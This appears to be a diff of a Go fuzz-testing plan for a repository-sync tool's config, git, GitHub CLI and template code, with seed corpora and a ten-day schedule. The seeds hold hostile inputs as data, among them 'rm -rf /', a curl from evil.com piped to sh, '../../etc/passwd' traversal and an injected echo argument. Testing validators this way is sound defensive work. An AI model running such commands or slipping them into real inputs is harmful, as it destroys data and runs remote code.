@@ -127,25 +127,25 @@ func (g *CorpusGenerator) GenerateConfigCorpus() error {
 source:
   repo: org/repo
   branch: main`,
-        
+
         // Edge cases
         `version: 999999`,
         `version: -1`,
         `version: "1.0"`,
-        
+
         // Security attempts
         `source: {repo: "../../etc/passwd"}`,
         `source: {repo: "org/repo; rm -rf /"}`,
         `source: {repo: "org/repo && curl evil.com/script | sh"}`,
-        
+
         // Unicode and special chars
         `source: {repo: "🎉/🎉"}`,
         `source: {repo: "org/repo\x00"}`,
-        
+
         // Deeply nested
         generateDeeplyNested(100),
     }
-    
+
     return g.saveCorpus("config", corpus)
 }
 
@@ -154,7 +154,7 @@ func (g *CorpusGenerator) saveCorpus(category string, corpus []string) error {
     if err := os.MkdirAll(dir, 0755); err != nil {
         return err
     }
-    
+
     for i, data := range corpus {
         file := filepath.Join(dir, fmt.Sprintf("seed_%d", i))
         if err := os.WriteFile(file, []byte(data), 0644); err != nil {
@@ -207,34 +207,34 @@ targets:
         []byte(`source: {repo: "../../etc/passwd"}`),
         []byte(`{{{{{{{{{}`),
     }
-    
+
     for _, seed := range seeds {
         f.Add(seed)
     }
-    
+
     f.Fuzz(func(t *testing.T, data []byte) {
         var cfg Config
         err := yaml.Unmarshal(data, &cfg)
-        
+
         if err != nil {
             // Parsing error is acceptable
             return
         }
-        
+
         // If parsed, must validate safely
         defer func() {
             if r := recover(); r != nil {
                 t.Fatalf("Panic during validation: %v with input: %s", r, string(data))
             }
         }()
-        
+
         validationErr := cfg.Validate()
         if validationErr == nil {
             // Valid config should not contain security issues
             if cfg.Source.Repo != "" && fuzz.ContainsPathTraversal(cfg.Source.Repo) {
                 t.Errorf("Path traversal in validated config: %s", cfg.Source.Repo)
             }
-            
+
             // Check all file mappings
             for _, target := range cfg.Targets {
                 for _, file := range target.Files {
@@ -265,30 +265,30 @@ func FuzzRepoNameValidation(f *testing.F) {
         "/repo",
         "org//repo",
     }
-    
+
     for _, seed := range seeds {
         f.Add(seed)
     }
-    
+
     f.Fuzz(func(t *testing.T, repoName string) {
         defer func() {
             if r := recover(); r != nil {
                 t.Fatalf("Panic in repo validation: %v with input: %s", r, repoName)
             }
         }()
-        
+
         isValid := isValidRepoName(repoName)
-        
+
         if isValid {
             // Additional security checks for valid names
             if fuzz.ContainsShellMetachars(repoName) {
                 t.Errorf("Shell metacharacters in valid repo name: %s", repoName)
             }
-            
+
             if fuzz.ContainsPathTraversal(repoName) {
                 t.Errorf("Path traversal in valid repo name: %s", repoName)
             }
-            
+
             // Should match GitHub format
             parts := strings.Split(repoName, "/")
             if len(parts) != 2 || parts[0] == "" || parts[1] == "" {
@@ -314,20 +314,20 @@ func FuzzBranchNameValidation(f *testing.F) {
         "分支",   // Chinese
         "",
     }
-    
+
     for _, seed := range seeds {
         f.Add(seed)
     }
-    
+
     f.Fuzz(func(t *testing.T, branch string) {
         defer func() {
             if r := recover(); r != nil {
                 t.Fatalf("Panic in branch validation: %v with input: %s", r, branch)
             }
         }()
-        
+
         isValid := isValidBranchName(branch)
-        
+
         if isValid {
             if fuzz.ContainsShellMetachars(branch) {
                 t.Errorf("Shell metacharacters in valid branch name: %s", branch)
@@ -372,18 +372,18 @@ func FuzzGitURLSafety(f *testing.F) {
         "https://github.com/../../../../etc/passwd",
         "git://[::1]/repo.git",
     }
-    
+
     for _, seed := range seeds {
         f.Add(seed)
     }
-    
+
     f.Fuzz(func(t *testing.T, url string) {
         defer func() {
             if r := recover(); r != nil {
                 t.Fatalf("Panic with URL: %v, input: %s", r, url)
             }
         }()
-        
+
         client := &gitClient{
             runner: &mockCommandRunner{
                 validateCommand: func(name string, args []string) error {
@@ -397,7 +397,7 @@ func FuzzGitURLSafety(f *testing.F) {
                 },
             },
         }
-        
+
         _ = client.Clone(context.Background(), url, "/tmp/test", "master", nil)
     })
 }
@@ -416,18 +416,18 @@ func FuzzGitFilePath(f *testing.F) {
         "file>.txt",
         "file<.txt",
     }
-    
+
     for _, seed := range seeds {
         f.Add(seed)
     }
-    
+
     f.Fuzz(func(t *testing.T, filePath string) {
         defer func() {
             if r := recover(); r != nil {
                 t.Fatalf("Panic with file path: %v, input: %s", r, filePath)
             }
         }()
-        
+
         client := &gitClient{
             runner: &mockCommandRunner{
                 validateCommand: func(name string, args []string) error {
@@ -447,7 +447,7 @@ func FuzzGitFilePath(f *testing.F) {
                 },
             },
         }
-        
+
         _ = client.Add(context.Background(), "/tmp/test", filePath)
     })
 }
@@ -489,18 +489,18 @@ func FuzzGitHubCLIArgs(f *testing.F) {
         {[]string{"repo", "clone", "../../etc/passwd"}},
         {[]string{"api", "/repos/org/repo", "-f", "name=test;echo injected"}},
     }
-    
+
     for _, seed := range seeds {
         f.Add(seed.args)
     }
-    
+
     f.Fuzz(func(t *testing.T, args []string) {
         defer func() {
             if r := recover(); r != nil {
                 t.Fatalf("Panic with args: %v, input: %v", r, args)
             }
         }()
-        
+
         client := &Client{
             runner: &mockRunner{
                 validateArgs: func(providedArgs []string) error {
@@ -514,7 +514,7 @@ func FuzzGitHubCLIArgs(f *testing.F) {
                 },
             },
         }
-        
+
         _, _ = client.run(args...)
     })
 }
@@ -529,21 +529,21 @@ func FuzzJSONParsing(f *testing.F) {
         `{"name": "very` + strings.Repeat("long", 10000) + `name"}`,
         `[{"name": "repo1"}, {"name": "repo2"}]`,
     }
-    
+
     for _, seed := range seeds {
         f.Add(seed)
     }
-    
+
     f.Fuzz(func(t *testing.T, jsonData string) {
         defer func() {
             if r := recover(); r != nil {
                 t.Fatalf("Panic parsing JSON: %v, input: %s", r, jsonData)
             }
         }()
-        
+
         var result interface{}
         err := parseJSON([]byte(jsonData), &result)
-        
+
         if err == nil {
             // Successfully parsed - check for security issues
             if str, ok := result.(string); ok {
@@ -608,35 +608,35 @@ func FuzzTemplateVariableReplacement(f *testing.F) {
             vars:     map[string]string{"UNICODE": "🎉🎊🎈"},
         },
     }
-    
+
     for _, seed := range seeds {
         templateBytes := []byte(seed.template)
         varsBytes, _ := json.Marshal(seed.vars)
         f.Add(templateBytes, varsBytes)
     }
-    
+
     f.Fuzz(func(t *testing.T, templateData []byte, varsData []byte) {
         defer func() {
             if r := recover(); r != nil {
                 t.Fatalf("Panic in template replacement: %v", r)
             }
         }()
-        
+
         var vars map[string]string
         if err := json.Unmarshal(varsData, &vars); err != nil {
             // Invalid vars JSON is acceptable
             return
         }
-        
+
         template := string(templateData)
         result := replaceVariables(template, vars)
-        
+
         // Check for infinite recursion protection
         if len(result) > len(template)*100 {
-            t.Errorf("Possible infinite expansion: template %d bytes -> result %d bytes", 
+            t.Errorf("Possible infinite expansion: template %d bytes -> result %d bytes",
                 len(template), len(result))
         }
-        
+
         // Check for security issues in result
         for key, value := range vars {
             if fuzz.ContainsPathTraversal(value) && strings.Contains(result, value) {
@@ -658,26 +658,26 @@ func FuzzRegexReplacement(f *testing.F) {
         {`[`, "X", "test[bracket"},  // Invalid regex
         {`.+`, "../etc/passwd", "replace with path"},
     }
-    
+
     for _, seed := range seeds {
         f.Add(seed.pattern, seed.replacement, seed.input)
     }
-    
+
     f.Fuzz(func(t *testing.T, pattern, replacement, input string) {
         defer func() {
             if r := recover(); r != nil {
                 t.Fatalf("Panic in regex replacement: %v", r)
             }
         }()
-        
+
         result, err := applyRegexTransform(pattern, replacement, input)
-        
+
         if err == nil && result != "" {
             // Check for exponential growth
             if len(result) > len(input)*10 {
                 t.Logf("Large expansion in regex: %d -> %d bytes", len(input), len(result))
             }
-            
+
             // Check for security issues
             if fuzz.ContainsPathTraversal(result) && !fuzz.ContainsPathTraversal(input) {
                 t.Errorf("Path traversal introduced by regex replacement")
@@ -716,12 +716,12 @@ The project already has `make test-fuzz` configured to automatically discover an
   - Create directory structure
   - Implement helper functions
   - Set up corpus generator
-  
+
 - **Day 3-4**: Implement config package fuzzing
   - YAML parsing fuzzer
   - Repository name validation
   - Branch name validation
-  
+
 - **Day 5**: Implement basic Git package fuzzing
   - URL safety fuzzer
   - Initial command injection tests
@@ -730,11 +730,11 @@ The project already has `make test-fuzz` configured to automatically discover an
 - **Day 6**: Complete Git package fuzzing
   - File path fuzzing
   - Advanced command safety tests
-  
+
 - **Day 7-8**: Implement GitHub CLI fuzzing
   - Argument injection tests
   - JSON parsing safety
-  
+
 - **Day 9-10**: Implement transform package fuzzing
   - Template variable replacement
   - Regex transformation safety
